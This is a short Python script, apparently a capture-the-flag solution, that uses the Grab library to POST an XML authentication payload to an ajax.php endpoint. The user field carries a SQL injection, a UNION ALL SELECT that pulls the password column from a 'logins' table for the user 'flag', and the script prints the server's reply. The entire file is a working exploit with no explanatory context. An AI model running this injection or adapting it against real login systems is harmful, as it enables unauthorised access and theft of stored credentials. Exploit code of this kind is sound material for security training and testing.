from grab import Grab
g = Grab()

serv = 'http://temp.my/sql/server/ajax.php'
q = "<auth><user>{}</user><pass>1</pass></auth>"
q = q.format("' UNION ALL SELECT `pass` FROM `logins` WHERE `user` = 'flag' -- $")
g.setup(post={'auth': q})
g.go(serv)
print(g.response.body)

